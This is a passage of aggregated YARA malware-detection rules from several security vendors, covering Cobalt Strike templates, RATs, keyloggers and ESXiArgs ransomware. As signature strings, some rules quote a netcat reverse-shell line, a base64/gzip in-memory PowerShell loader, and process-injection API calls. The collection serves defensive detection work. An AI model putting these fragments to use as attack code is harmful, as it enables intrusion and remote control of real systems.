		license_url = "https://github.com/eset/malware-ioc/blob/eeab168d4cd6bac7c5bd06defb3d7198bd58f37f/LICENSE"
		logic_hash = "3be86c9325de6634c032321beed131fdf1e1952afcb43258fb202d0097610501"
		score = 75
		quality = 80
		tags = ""
		contact = "github@eset.com"
		license = "BSD 2-Clause"

	strings:
		$s1 = "mapid.tlb"
		$s2 = "msmime.dll"
		$s3 = "scawrdot.db"

	condition:
		any of them
}

rule ESET_Sparklinggoblin_Mutex_2
{
	meta:
		description = "SparklingGoblin ChaCha20 loaders mutexes"
		author = "ESET Research"
		id = "e33d2bc1-29d6-5117-8e0f-31f8bced0979"
		date = "2021-05-20"
		modified = "2021-08-26"
		reference = "https://github.com/eset/malware-ioc/"
		source_url = "https://github.com/eset/malware-ioc/blob/eeab168d4cd6bac7c5bd06defb3d7198bd58f37f/sparklinggoblin/SparklingGoblin.yar#L465-L489"
		license_url = "https://github.com/eset/malware-ioc/blob/eeab168d4cd6bac7c5bd06defb3d7198bd58f37f/LICENSE"
		hash = "2edbea43f5c40c867e5b6bbd93cc972525df598b"
		hash = "b6d245d3d49b06645c0578804064ce0c072cbe0f"
		hash = "8be6d5f040d0085c62b1459afc627707b0de89cf"
		hash = "4668302969fe122874fb2447a80378dcb671c86b"
		hash = "9bdecb08e16a23d271d0a3e836d9e7f83d7e2c3b"
		hash = "9ce7650f2c08c391a35d69956e171932d116b8bd"
		logic_hash = "00fbd514c8e2d6dea3b0f175e857a613e158b64caf1f970e814d62f1ebe9d35c"
		score = 75
		quality = 80
		tags = ""
		license = "BSD 2-Clause"

	strings:
		$mutex_1 = "kREwdFrOlvASgP4zWZyV89m6T2K0bIno"
		$mutex_2 = "v5EPQFOImpTLaGZes3Nl1JSKHku8AyCw"

	condition:
		any of them
}

rule ESET_Apt_Windows_TA410_Tendyron_Installer_2
{
	meta:
		description = "TA410 Tendyron Installer"
		author = "ESET Research"
		id = "95ccad1c-99fb-5d38-aec0-650db3e06b35"
		date = "2020-12-09"
		modified = "2022-04-27"
		reference = "https://github.com/eset/malware-ioc/"
		source_url = "https://github.com/eset/malware-ioc/blob/eeab168d4cd6bac7c5bd06defb3d7198bd58f37f/ta410/ta410.yar#L55-L73"
		license_url = "https://github.com/eset/malware-ioc/blob/eeab168d4cd6bac7c5bd06defb3d7198bd58f37f/LICENSE"
		logic_hash = "9c3afb924747614f27c31cf2c3d98f4932a9d11597a3ac94263bf93be02801da"
		score = 75
		quality = 80
		tags = ""
		license = "BSD 2-Clause"
		version = "1"

	strings:
		$s1 = "Tendyron" wide
		$s2 = "OnKeyToken_KEB.dll" wide
		$s3 = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run" wide
		$s4 = "Global\\8D32CCB321B2"
		$s5 = "\\RTFExploit\\"

	condition:
		int16 ( 0 ) == 0x5A4D and 3 of them
}

rule ESET_Apt_Windows_TA410_X4_Strings_2
{
	meta:
		description = "Matches various strings found in TA410 X4"
		author = "ESET Research"
		id = "e6af4516-8b79-5182-8571-7dd530632ddc"
		date = "2020-10-09"
		modified = "2022-04-27"
		reference = "https://github.com/eset/malware-ioc/"
		source_url = "https://github.com/eset/malware-ioc/blob/eeab168d4cd6bac7c5bd06defb3d7198bd58f37f/ta410/ta410.yar#L109-L125"
		license_url = "https://github.com/eset/malware-ioc/blob/eeab168d4cd6bac7c5bd06defb3d7198bd58f37f/LICENSE"
		logic_hash = "d4b2321a6d0eb0ca8d7c47596af2a45c22b3aef15d1832d64d6588a62cab312a"
		score = 75
		quality = 74
		tags = ""
		license = "BSD 2-Clause"
		version = "1"

	strings:
		$s1 = "[X]InLoadSC" ascii wide nocase
		$s3 = "MachineKeys\\Log\\rsa.txt" ascii wide nocase
		$s4 = "MachineKeys\\Log\\output.log" ascii wide nocase

	condition:
		any of them
}

rule FIREEYE_RT_APT_Backdoor_Win_Gorat_Memory_2
{
	meta:
		description = "Identifies GoRat malware in memory based on strings."
		author = "FireEye"
		id = "16fb1db7-711c-5d8d-9203-738c94f253fe"
		date = "2020-12-09"
		modified = "2020-12-09"
		reference = "https://github.com/mandiant/red_team_tool_countermeasures/"
		source_url = "https://github.com/mandiant/red_team_tool_countermeasures//blob/3561b71724dbfa3e2bb78106aaa2d7f8b892c43b/rules/REDFLARE (Gorat)/production/yara/APT_Backdoor_Win_GoRat_Memory.yar#L4-L27"
		license_url = "https://github.com/mandiant/red_team_tool_countermeasures//blob/3561b71724dbfa3e2bb78106aaa2d7f8b892c43b/LICENSE.txt"
		hash = "3b926b5762e13ceec7ac3a61e85c93bb"
		logic_hash = "88272e59325d106f96d6b6f1d57daf968823c1e760067dee0334c66c521ce8c2"
		score = 75
		quality = 75
		tags = ""
		rev = 1

	strings:
		$murica = "murica" fullword
		$rat1 = "rat/modules/socks.(*HTTPProxyClient).beacon" fullword
		$rat2 = "rat.(*Core).generateBeacon" fullword
		$rat3 = "rat.gJitter" fullword
		$rat4 = "rat/comms.(*protectedChannel).SendCmdResponse" fullword
		$rat5 = "rat/modules/filemgmt.(*acquire).NewCommandExecution" fullword
		$rat6 = "rat/modules/latlisten.(*latlistensrv).handleCmd" fullword
		$rat7 = "rat/modules/netsweeper.(*netsweeperRunner).runSweep" fullword
		$rat8 = "rat/modules/netsweeper.(*Pinger).listen" fullword
		$rat9 = "rat/modules/socks.(*HTTPProxyClient).beacon" fullword
		$rat10 = "rat/platforms/win/dyloader.(*memoryLoader).ExecutePluginFunction" fullword
		$rat11 = "rat/platforms/win/modules/namedpipe.(*dummy).Open" fullword
		$winblows = "rat/platforms/win.(*winblows).GetStage" fullword

	condition:
		$winblows or #murica > 10 or 3 of ( $rat* )
}

rule FIREEYE_RT_Trojan_Macro_RESUMEPLEASE_1_2
{
	meta:
		description = "No description has been set in the source file - FireEye-RT"
		author = "FireEye"
		id = "068662f6-28b8-5538-8bc3-6506565305ae"
		date = "2020-12-01"
		date = "2020-12-01"
		modified = "2020-12-09"
		reference = "https://github.com/mandiant/red_team_tool_countermeasures/"
		source_url = "https://github.com/mandiant/red_team_tool_countermeasures//blob/3561b71724dbfa3e2bb78106aaa2d7f8b892c43b/rules/RESUMEPLEASE/production/yara/Trojan_Macro_RESUMEPLEASE_1.yar#L4-L21"
		license_url = "https://github.com/mandiant/red_team_tool_countermeasures//blob/3561b71724dbfa3e2bb78106aaa2d7f8b892c43b/LICENSE.txt"
		hash = "d5d3d23c8573d999f1c48d3e211b1066"
		logic_hash = "040457bc446e496431129ff4623ddda5d9c2ce339ba65a7fbe42114626f36c60"
		score = 75
		quality = 75
		tags = ""
		rev = 1

	strings:
		$str00 = "For Binary As"
		$str01 = "Range.Text"
		$str02 = "Environ("
		$str03 = "CByte("
		$str04 = ".SpawnInstance_"
		$str05 = ".Create("

	condition:
		all of them
}

rule FIREEYE_RT_APT_Builder_PY_REDFLARE_1_2
{
	meta:
		description = "No description has been set in the source file - FireEye-RT"
		author = "FireEye"
		id = "3b5ad25d-ce66-572e-9a91-40a73b8fd447"
		date = "2020-11-27"
		date = "2020-11-27"
		modified = "2020-12-09"
		reference = "https://github.com/mandiant/red_team_tool_countermeasures/"
		source_url = "https://github.com/mandiant/red_team_tool_countermeasures//blob/3561b71724dbfa3e2bb78106aaa2d7f8b892c43b/rules/REDFLARE/production/yara/APT_Builder_PY_REDFLARE_1.yar#L4-L22"
		license_url = "https://github.com/mandiant/red_team_tool_countermeasures//blob/3561b71724dbfa3e2bb78106aaa2d7f8b892c43b/LICENSE.txt"
		hash = "d0a830403e56ebaa4bfbe87dbfdee44f"
		logic_hash = "1948cadb7242eb69bffbc222802ce9c1af38d7a846da09b6343b1449fe054e42"
		score = 75
		quality = 75
		tags = ""
		rev = 1

	strings:
		$1 = "LOAD_OFFSET_32 = 0x612"
		$2 = "LOAD_OFFSET_64 = 0x611"
		$3 = "class RC4:"
		$4 = "struct.pack('<Q' if is64b else '<L'"
		$5 = "stagerConfig['comms']['config']"
		$6 = "_x86.dll"
		$7 = "_x64.dll"

	condition:
		all of them and @1 [ 1 ] < @2 [ 1 ] and @2 [ 1 ] < @3 [ 1 ] and @3 [ 1 ] < @4 [ 1 ] and @4 [ 1 ] < @5 [ 1 ]
}

rule GCTI_Cobaltstrike_Resources_Template_X64_Ps1_V3_0_To_V4_X_Excluding_3_12_3_13_2
{
	meta:
		description = "Cobalt Strike's resources/template.x64.ps1, resources/template.hint.x64.ps1 and resources/template.hint.x32.ps1 from v3.0 to v4.x except 3.12 and 3.13"
		author = "gssincla@google.com"
		id = "5a808113-aacb-56ca-b3ec-166c73c54b85"
		date = "2022-11-18"
		modified = "2022-11-19"
		reference = "https://cloud.google.com/blog/products/identity-security/making-cobalt-strike-harder-for-threat-actors-to-abuse"
		source_url = "https://github.com/chronicle/GCTI/blob/1c5fd42b1895098527fde00c2d9757edf6b303bb/YARA/CobaltStrike/CobaltStrike__Resources_Template_x64_Ps1_v3_0_to_v4_x_excluding_3_12_3_13.yara#L17-L37"
		license_url = "https://github.com/chronicle/GCTI/blob/1c5fd42b1895098527fde00c2d9757edf6b303bb/LICENSE"
		hash = "ff743027a6bcc0fee02107236c1f5c96362eeb91f3a5a2e520a85294741ded87"
		logic_hash = "80823b8590004686ebd83958cad16094ea2f6958a837d87934507531a00df77a"
		score = 75
		quality = 81
		tags = ""

	strings:
		$dda = "[AppDomain]::CurrentDomain.DefineDynamicAssembly" nocase
		$imm = "InMemoryModule" nocase
		$mdt = "MyDelegateType" nocase
		$rd = "New-Object System.Reflection.AssemblyName('ReflectedDelegate')" nocase
		$data = "[Byte[]]$var_code = [System.Convert]::FromBase64String(" nocase
		$64bitSpecific = "[IntPtr]::size -eq 8"
		$mandatory = "Mandatory = $True"

	condition:
		all of them
}

rule GCTI_Cobaltstrike_Resources_Template_Sct_V3_3_To_V4_X_2
{
	meta:
		description = "Cobalt Strike's resources/template.sct signature for versions v3.3 to v4.x"
		author = "gssincla@google.com"
		id = "9d2b1dfa-5f76-503f-9198-6ed0d039e0cb"
		date = "2022-11-18"
		modified = "2022-11-19"
		reference = "https://cloud.google.com/blog/products/identity-security/making-cobalt-strike-harder-for-threat-actors-to-abuse"
		source_url = "https://github.com/chronicle/GCTI/blob/1c5fd42b1895098527fde00c2d9757edf6b303bb/YARA/CobaltStrike/CobaltStrike__Resources_Template_Sct_v3_3_to_v4_x.yara#L17-L38"
		license_url = "https://github.com/chronicle/GCTI/blob/1c5fd42b1895098527fde00c2d9757edf6b303bb/LICENSE"
		hash = "fc66cb120e7bc9209882620f5df7fdf45394c44ca71701a8662210cf3a40e142"
		logic_hash = "8868445ced4945c469764b7f311d6cb11c99cf0f2d770113e5e617e0187a962c"
		score = 75
		quality = 85
		tags = ""

	strings:
		$scriptletstart = "<scriptlet>" nocase
		$registration = "<registration progid=" nocase
		$classid = "classid=" nocase
		$scriptlang = "<script language=\"vbscript\">" nocase
		$cdata = "<![CDATA["
		$scriptend = "</script>" nocase
		$antiregistration = "</registration>" nocase
		$scriptletend = "</scriptlet>"

	condition:
		all of them and @scriptletstart [ 1 ] < @registration [ 1 ] and @registration [ 1 ] < @classid [ 1 ] and @classid [ 1 ] < @scriptlang [ 1 ] and @scriptlang [ 1 ] < @cdata [ 1 ]
}

rule GCTI_Cobaltstrike_Resources_Command_Ps1_V2_5_To_V3_7_And_Resources_Compress_Ps1_V3_8_To_V4_X_2
{
	meta:
		description = "Cobalt Strike's resources/command.ps1 for versions 2.5 to v3.7 and resources/compress.ps1 from v3.8 to v4.x"
		author = "gssincla@google.com"
		id = "c0b81deb-ed20-5f7e-8e15-e6a9e9362594"
		date = "2022-11-18"
		modified = "2022-11-22"
		reference = "https://cloud.google.com/blog/products/identity-security/making-cobalt-strike-harder-for-threat-actors-to-abuse"
		source_url = "https://github.com/chronicle/GCTI/blob/1c5fd42b1895098527fde00c2d9757edf6b303bb/YARA/CobaltStrike/CobaltStrike__Resources_Command_Ps1_v2_5_to_v3_7_and_Resources_Compress_Ps1_v3_8_to_v4_x.yara#L17-L33"
		license_url = "https://github.com/chronicle/GCTI/blob/1c5fd42b1895098527fde00c2d9757edf6b303bb/LICENSE"
		hash = "932dec24b3863584b43caf9bb5d0cfbd7ed1969767d3061a7abdc05d3239ed62"
		logic_hash = "31cf47060757b086d325cd205724a7be8931bbbc6ff2f4be67a6179ee99c42ca"
		score = 75
		quality = 85
		tags = ""

	strings:
		$ps1 = "$s=New-Object \x49O.MemoryStream(,[Convert]::\x46romBase64String(" nocase
		$ps2 = "));IEX (New-Object IO.StreamReader(New-Object IO.Compression.GzipStream($s,[IO.Compression.CompressionMode]::Decompress))).ReadToEnd();" nocase

	condition:
		all of them
}

rule GCTI_Cobaltstrike_Resources_Template_X86_Vba_V3_8_To_V4_X_2
{
	meta:
		description = "Cobalt Strike's resources/template.x86.vba signature for versions v3.8 to v4.x"
		author = "gssincla@google.com"
		id = "11c7758e-93b2-5fe3-873d-b98de579d2b4"
		date = "2022-11-18"
		modified = "2022-11-19"
		reference = "https://cloud.google.com/blog/products/identity-security/making-cobalt-strike-harder-for-threat-actors-to-abuse"
		source_url = "https://github.com/chronicle/GCTI/blob/1c5fd42b1895098527fde00c2d9757edf6b303bb/YARA/CobaltStrike/CobaltStrike__Resources_Template_x86_Vba_v3_8_to_v4_x.yara#L17-L37"
		license_url = "https://github.com/chronicle/GCTI/blob/1c5fd42b1895098527fde00c2d9757edf6b303bb/LICENSE"
		hash = "fc66cb120e7bc9209882620f5df7fdf45394c44ca71701a8662210cf3a40e142"
		logic_hash = "7114515477d82651806eccef34f599f6ffd4614f987dee29417ac6ef7a1a1c38"
		score = 75
		quality = 85
		tags = ""

	strings:
		$createstuff = "Function CreateStuff Lib \"kernel32\" Alias \"CreateRemoteThread\"" nocase
		$allocstuff = "Function AllocStuff Lib \"kernel32\" Alias \"VirtualAllocEx\"" nocase
		$writestuff = "Function WriteStuff Lib \"kernel32\" Alias \"WriteProcessMemory\"" nocase
		$runstuff = "Function RunStuff Lib \"kernel32\" Alias \"CreateProcessA\"" nocase
		$vars = "Dim rwxpage As Long" nocase
		$res = "RunStuff(sNull, sProc, ByVal 0&, ByVal 0&, ByVal 1&, ByVal 4&, ByVal 0&, sNull, sInfo, pInfo)"
		$rwxpage = "AllocStuff(pInfo.hProcess, 0, UBound(myArray), &H1000, &H40)"

	condition:
		all of them and @vars [ 1 ] < @res [ 1 ] and @allocstuff [ 1 ] < @rwxpage [ 1 ]
}

rule GCTI_Cobaltstrike_Resources_Template_Py_V3_3_To_V4_X_2
{
	meta:
		description = "Cobalt Strike's resources/template.py signature for versions v3.3 to v4.x"
		author = "gssincla@google.com"
		id = "16aef9a9-b217-5462-93dc-f6273c99ddd0"
		date = "2022-11-18"
		modified = "2022-11-19"
		reference = "https://cloud.google.com/blog/products/identity-security/making-cobalt-strike-harder-for-threat-actors-to-abuse"
		source_url = "https://github.com/chronicle/GCTI/blob/1c5fd42b1895098527fde00c2d9757edf6b303bb/YARA/CobaltStrike/CobaltStrike__Resources_Template_Py_v3_3_to_v4_x.yara#L17-L36"
		license_url = "https://github.com/chronicle/GCTI/blob/1c5fd42b1895098527fde00c2d9757edf6b303bb/LICENSE"
		hash = "d5cb406bee013f51d876da44378c0a89b7b3b800d018527334ea0c5793ea4006"
		logic_hash = "3c26cea4b8f2b200bf58e939ae9ead7a7339d4ec0de8c72b3d9c7da897600081"
		score = 75
		quality = 85
		tags = ""

	strings:
		$arch = "platform.architecture()"
		$nope = "WindowsPE"
		$alloc = "ctypes.windll.kernel32.VirtualAlloc"
		$movemem = "ctypes.windll.kernel32.RtlMoveMemory"
		$thread = "ctypes.windll.kernel32.CreateThread"
		$wait = "ctypes.windll.kernel32.WaitForSingleObject"

	condition:
		all of them
}

rule GCTI_Cobaltstrike_Resources_Template__X32_X64_Ps1_V1_45_To_V2_5_And_V3_11_To_V3_14_2
{
	meta:
		description = "Cobalt Strike's resources/template.x64.ps1, resources/template.x32 from v3.11 to v3.14 and resources/template.ps1 from v1.45 to v2.5 "
		author = "gssincla@google.com"
		id = "c9fa6a39-0098-5dde-9762-94bc6b2df299"
		date = "2022-11-18"
		modified = "2022-11-19"
		reference = "https://cloud.google.com/blog/products/identity-security/making-cobalt-strike-harder-for-threat-actors-to-abuse"
		source_url = "https://github.com/chronicle/GCTI/blob/1c5fd42b1895098527fde00c2d9757edf6b303bb/YARA/CobaltStrike/CobaltStrike__Resources_Template__x32_x64_Ps1_v1_45_to_v2_5_and_v3_11_to_v3_14.yara#L17-L43"
		license_url = "https://github.com/chronicle/GCTI/blob/1c5fd42b1895098527fde00c2d9757edf6b303bb/LICENSE"
		hash = "ff743027a6bcc0fee02107236c1f5c96362eeb91f3a5a2e520a85294741ded87"
		logic_hash = "5196f111f257239d2e7e4ca342e7fc8bac1687743bc8c7ff23addf1f094b2e93"
		score = 75
		quality = 85
		tags = ""

	strings:
		$importVA = "[DllImport(\"kernel32.dll\")] public static extern IntPtr VirtualAlloc" nocase
		$importCT = "[DllImport(\"kernel32.dll\")] public static extern IntPtr CreateThread" nocase
		$importWFSO = "[DllImport(\"kernel32.dll\")] public static extern int WaitForSingleObject" nocase
		$compiler = "New-Object Microsoft.CSharp.CSharpCodeProvider" nocase
		$params = "New-Object System.CodeDom.Compiler.CompilerParameters" nocase
		$paramsSys32 = ".ReferencedAssemblies.AddRange(@(\"System.dll\", [PsObject].Assembly.Location))" nocase
		$paramsGIM = ".GenerateInMemory = $True" nocase
		$result = "$compiler.CompileAssemblyFromSource($params, $assembly)" nocase

	condition:
		all of them
}

rule JPCERTCC_Himawari_2
{
	meta:
		description = "detect Himawari(a variant of RedLeaves) in memory"
		author = "JPCERT/CC Incident Response Group"
		id = "85c33dc6-0f9b-5645-b236-f416df16b4a4"
		date = "2021-08-16"
		modified = "2021-08-16"
		reference = "https://www.jpcert.or.jp/present/2018/JSAC2018_01_nakatsuru.pdf"
		source_url = "https://github.com/JPCERTCC/MalConfScan//blob/19ec0d145535a6a4cfd37c0960114f455a8c343e/yara/rule.yara#L68-L82"
		license_url = "https://github.com/JPCERTCC/MalConfScan//blob/19ec0d145535a6a4cfd37c0960114f455a8c343e/LICENSE.txt"
		logic_hash = "9014e6e02fb9d8fa0f646c61647ab28c3cb08f10f8f584ddd11eba27211307f5"
		score = 75
		quality = 80
		tags = ""
		rule_usage = "memory scan"
		hash1 = "3938436ab73dcd10c495354546265d5498013a6d17d9c4f842507be26ea8fafb"

	strings:
		$h1 = "himawariA"
		$h2 = "himawariB"
		$h3 = "HimawariDemo"

	condition:
		all of them
}

rule JPCERTCC_Hawkeye_2
{
	meta:
		description = "detect HawkEye in memory"
		author = "JPCERT/CC Incident Response Group"
		id = "fc988aaf-bdac-5a53-a90c-d35d86285cd6"
		date = "2021-08-16"
		modified = "2021-08-16"
		reference = "internal research"
		source_url = "https://github.com/JPCERTCC/MalConfScan//blob/19ec0d145535a6a4cfd37c0960114f455a8c343e/yara/rule.yara#L259-L272"
		license_url = "https://github.com/JPCERTCC/MalConfScan//blob/19ec0d145535a6a4cfd37c0960114f455a8c343e/LICENSE.txt"
		logic_hash = "45256e1e56de3934d2e57a7c036d49a0f56c25538ed7ad3eb7ee8efa7f549e98"
		score = 75
		quality = 80
		tags = ""
		rule_usage = "memory scan"

	strings:
		$hawkstr1 = "HawkEye Keylogger" wide
		$hawkstr2 = "Dear HawkEye Customers!" wide
		$hawkstr3 = "HawkEye Logger Details:" wide

	condition:
		all of them
}

rule JPCERTCC_Xxmm_2
{
	meta:
		description = "detect xxmm in memory"
		author = "JPCERT/CC Incident Response Group"
		id = "be459cbf-84a1-539e-b0b5-b7a00b6d278d"
		date = "2021-08-16"
		modified = "2021-08-16"
		reference = "internal research"
		source_url = "https://github.com/JPCERTCC/MalConfScan//blob/19ec0d145535a6a4cfd37c0960114f455a8c343e/yara/rule.yara#L306-L319"
		license_url = "https://github.com/JPCERTCC/MalConfScan//blob/19ec0d145535a6a4cfd37c0960114f455a8c343e/LICENSE.txt"
		logic_hash = "4a860ac3efb97ce03fa906c2d0e7cd08654f6e82531d9449af7891be83a036d5"
		score = 75
		quality = 80
		tags = ""
		rule_usage = "memory scan"

	strings:
		$v1 = "setupParameter:"
		$v2 = "loaderParameter:"
		$v3 = "parameter:"

	condition:
		all of them
}

rule JPCERTCC_Netwire_2
{
	meta:
		description = "detect netwire in memory"
		author = "JPCERT/CC Incident Response Group"
		id = "cf71b80f-2618-5209-bb49-fefea9e0a7f3"
		date = "2021-08-16"
		modified = "2021-08-16"
		reference = "internal research"
		source_url = "https://github.com/JPCERTCC/MalConfScan//blob/19ec0d145535a6a4cfd37c0960114f455a8c343e/yara/rule.yara#L351-L367"
		license_url = "https://github.com/JPCERTCC/MalConfScan//blob/19ec0d145535a6a4cfd37c0960114f455a8c343e/LICENSE.txt"
		logic_hash = "fa6ec967b6b3de226dcdb06d6b8f684800331a2420f038dd6274a8b9c3d8be78"
		score = 75
		quality = 80
		tags = ""
		rule_usage = "memory scan"

	strings:
		$v1 = "HostId-%Rand%"
		$v2 = "mozsqlite3"
		$v3 = "[Scroll Lock]"
		$v4 = "GetRawInputData"
		$ping = "ping 192.0.2.2"
		$log = "[Log Started] - [%.2d/%.2d/%d %.2d:%.2d:%.2d]"

	condition:
		($v1 ) or ( $v2 and $v3 and $v4 ) or ( $ping and $log )
}

rule JPCERTCC_Nanocore_2
{
	meta:
		description = "detect Nanocore in memory"
		author = "JPCERT/CC Incident Response Group"
		id = "0b12ad94-99c2-5d48-a860-ff75b82971af"
		date = "2021-08-16"
		modified = "2021-08-16"
		reference = "internal research"
		source_url = "https://github.com/JPCERTCC/MalConfScan//blob/19ec0d145535a6a4cfd37c0960114f455a8c343e/yara/rule.yara#L369-L382"
		license_url = "https://github.com/JPCERTCC/MalConfScan//blob/19ec0d145535a6a4cfd37c0960114f455a8c343e/LICENSE.txt"
		logic_hash = "471dcda6f5fb9c30e3a1df7171fdba889114d54166d038d18c7910e2765d5250"
		score = 75
		quality = 80
		tags = ""
		rule_usage = "memory scan"

	strings:
		$v1 = "NanoCore Client"
		$v2 = "PluginCommand"
		$v3 = "CommandType"

	condition:
		all of them
}

rule JPCERTCC_Agenttesla_Type1_2
{
	meta:
		description = "detect Agenttesla in memory"
		author = "JPCERT/CC Incident Response Group"
		id = "92bfb3ab-d8d0-50ec-8ab8-ad34f1edb906"
		date = "2021-08-16"
		modified = "2021-08-16"
		reference = "internal research"
		source_url = "https://github.com/JPCERTCC/MalConfScan//blob/19ec0d145535a6a4cfd37c0960114f455a8c343e/yara/rule.yara#L399-L411"
		license_url = "https://github.com/JPCERTCC/MalConfScan//blob/19ec0d145535a6a4cfd37c0960114f455a8c343e/LICENSE.txt"
		logic_hash = "24b9b815400967a9086048527f7aa1fce08bcd94a16aec8080aeac97045b297a"
		score = 75
		quality = 80
		tags = ""
		rule_usage = "memory scan"

	strings:
		$iestr = "C:\\\\Users\\\\Admin\\\\Desktop\\\\IELibrary\\\\IELibrary\\\\obj\\\\Debug\\\\IELibrary.pdb"
		$atstr = "C:\\\\Users\\\\Admin\\\\Desktop\\\\ConsoleApp1\\\\ConsoleApp1\\\\obj\\\\Debug\\\\ConsoleApp1.pdb"
		$sqlitestr = "Not a valid SQLite 3 Database File" wide

	condition:
		all of them
}

rule JPCERTCC_Noderat_2
{
	meta:
		description = "detect Noderat in memory"
		author = "JPCERT/CC Incident Response Group"
		id = "9c2c4b0f-0f45-54f6-a98c-b592af882eef"
		date = "2021-08-16"
		modified = "2021-08-16"
		reference = "https://blogs.jpcert.or.jp/ja/2019/02/tick-activity.html"
		source_url = "https://github.com/JPCERTCC/MalConfScan//blob/19ec0d145535a6a4cfd37c0960114f455a8c343e/yara/rule.yara#L429-L442"
		license_url = "https://github.com/JPCERTCC/MalConfScan//blob/19ec0d145535a6a4cfd37c0960114f455a8c343e/LICENSE.txt"
		logic_hash = "e1254b6cf28161943db202ea0a6ff2d86aa7975d4a3ecc0f26eed58101e54960"
		score = 75
		quality = 80
		tags = ""
		rule_usage = "memory scan"

	strings:
		$config = "/config/app.json"
		$key = "/config/.regeditKey.rc"
		$message = "uninstall error when readFileSync: "

	condition:
		all of them
}

rule JPCERTCC_Njrat_2
{
	meta:
		description = "detect njRAT in memory"
		author = "JPCERT/CC Incident Response Group"
		id = "96b35796-3e1d-5721-998a-e678612e4de7"
		date = "2021-08-16"
		modified = "2021-08-16"
		reference = "https://github.com/JPCERTCC/MalConfScan/"
		source_url = "https://github.com/JPCERTCC/MalConfScan//blob/19ec0d145535a6a4cfd37c0960114f455a8c343e/yara/rule.yara#L444-L456"
		license_url = "https://github.com/JPCERTCC/MalConfScan//blob/19ec0d145535a6a4cfd37c0960114f455a8c343e/LICENSE.txt"
		logic_hash = "398614ff5ea37dfaf6c36f60702cb7cdfe66b4569c698e9c3ea29563e4031856"
		score = 75
		quality = 80
		tags = ""
		rule_usage = "memory scan"
		hash1 = "d5f63213ce11798879520b0e9b0d1b68d55f7727758ec8c120e370699a41379d"

	strings:
		$reg = "SEE_MASK_NOZONECHECKS" wide fullword
		$msg = "Execute ERROR" wide fullword
		$ping = "cmd.exe /c ping 0 -n 2 & del" wide fullword

	condition:
		all of them
}

rule JPCERTCC_Remcos_1_2
{
	meta:
		description = "detect Remcos in memory"
		author = "JPCERT/CC Incident Response Group"
		id = "4a27a16a-2669-5009-bc82-082ec0c9b2c1"
		date = "2021-08-16"
		modified = "2021-08-16"
		reference = "https://github.com/JPCERTCC/MalConfScan/"
		source_url = "https://github.com/JPCERTCC/MalConfScan//blob/19ec0d145535a6a4cfd37c0960114f455a8c343e/yara/rule.yara#L480-L493"
		license_url = "https://github.com/JPCERTCC/MalConfScan//blob/19ec0d145535a6a4cfd37c0960114f455a8c343e/LICENSE.txt"
		logic_hash = "1b4b9f7a88f33faeda71ea9a354eeccba8889800f48a6280c4ec533bb1b3ef3d"
		score = 75
		quality = 80
		tags = ""
		rule_usage = "memory scan"
		hash1 = "7d5efb7e8b8947e5fe1fa12843a2faa0ebdfd7137582e5925a0b9c6a9350b0a5"

	strings:
		$remcos = "Remcos" ascii fullword
		$url1 = "Breaking-Security.Net" ascii fullword
		$url2 = "BreakingSecurity.Net" ascii fullword
		$resource = "SETTINGS" ascii wide fullword

	condition:
		1 of ( $url* ) and $remcos and $resource
}

rule SECUINFRA_OBFUS_Javascript_Wscript_Hex_Strings_Usage_2
{
	meta:
		description = "Detects the frequent usage of Wscript to get an hex encoded string from an array and interpret it. Used by e.g WSHRAT"
		author = "SECUINFRA Falcon Team"
		id = "dd55753e-4f7b-56be-a6d4-66f1d7dc8747"
		date = "2022-12-02"
		modified = "2022-02-13"
		reference = "https://github.com/SIFalcon/Detection"
		source_url = "https://github.com/SIFalcon/Detection/blob/2d7c66d7d16c7541bf2a9a83a7a6d334364a26fd/Yara/Obfuscation/javascript_obfuscation.yar#L2-L19"
		license_url = "N/A"
		logic_hash = "62bc3261b3c2e902a82423239a7ee0bcedfccbeeeda11833b935197144dc7c35"
		score = 75
		quality = 70
		tags = ""

	strings:
		$wscript = "= WScript["
		$hex_enc_str1 = "\\x63\\x72\\x65\\x61"
		$hex_enc_str2 = "\\x73\\x63\\x72\\x69"
		$hex_enc_str3 = "\\x71\\x75\\x69\\x74"
		$hex_enc_str4 = "\\x41\\x72\\x67\\x75"

	condition:
		#wscript> 30 and 2 of ( $hex_enc_str* )
}

rule SECUINFRA_RANSOM_Esxiargs_Ransomware_Python_Feb23_2
{
	meta:
		description = "Detects the ESXiArgs Ransomware encryption bash script"
		author = "SECUINFRA Falcon Team (@SI_FalconTeam)"
		id = "6e2d6695-b727-5b71-bfa0-e8290e057c36"
		date = "2023-02-07"
		modified = "2023-02-07"
		reference = "https://secuinfra.com/en/techtalk/hide-your-hypervisor-analysis-of-esxiargs-ransomware"
		source_url = "https://github.com/SIFalcon/Detection/blob/2d7c66d7d16c7541bf2a9a83a7a6d334364a26fd/Yara/Malware/RANSOM_ESXiArgs_Ransomware_Python_Feb23.yar#L1-L31"
		license_url = "N/A"
		logic_hash = "b821d1829ab4fb5eea896156a303198d6531d734196f0f947aef5d46754e6ccb"
		score = 75
		quality = 70
		tags = ""
		tlp = "CLEAR"

	strings:
		$python = "#!/bin/python"
		$desc = "This module starts debug tools"
		$command0 = "server_namespace"
		$command1 = "service_instance"
		$command2 = "local"
		$command3 = "operation_id"
		$command4 = "envelope"
		$cmd = "'mkfifo /tmp/tmpy_8th_nb; cat /tmp/tmpy_8th_nb | /bin/sh -i 2>&1 | nc %s %s > /tmp/tmpy_8th_nb' % (host, port)"
		$OpenSLPPort = "port = '427'"
		$listener = "HTTPServer(('127.0.0.1', 8008), PostServer).serve_forever()"

	condition:
		$python and $desc and 4 of ( $command* ) and $cmd and $OpenSLPPort and $listener
}

rule SECUINFRA_MALWARE_Plugx_USB_Delivery_Ini_Icon_Jun23_2
{
	meta:
		description = "Detects PlugX-style Malware delivery via removable Drives (USB) - Desktop.ini Icon File; could potentially yield FPs"
		author = "SECUINFRA Falcon Team (@SI_FalconTeam)"
		id = "faaa507f-8478-5412-be86-4cae7fe28d21"
		date = "2023-06-21"
		modified = "2023-06-21"
		reference = "https://unit42.paloaltonetworks.com/plugx-variants-in-usbs/"
		source_url = "https://github.com/SIFalcon/Detection/blob/2d7c66d7d16c7541bf2a9a83a7a6d334364a26fd/Yara/Malware/MALWARE_PlugX_USB_Delivery_Jun21.yar#L33-L49"
		license_url = "N/A"
		logic_hash = "1cf552c4627073d13832cf0ac602a610e0919af9e9a197aa07fef5d6a414644b"
		score = 75
		quality = 70
		tags = ""
		tlp = "CLEAR"

	strings:
		$s_shellclassinfo = "[.ShellClassInfo]" ascii
		$s_IconRes = "IconResource=C:\\Windows\\system32\\SHELL32.dll,7" ascii

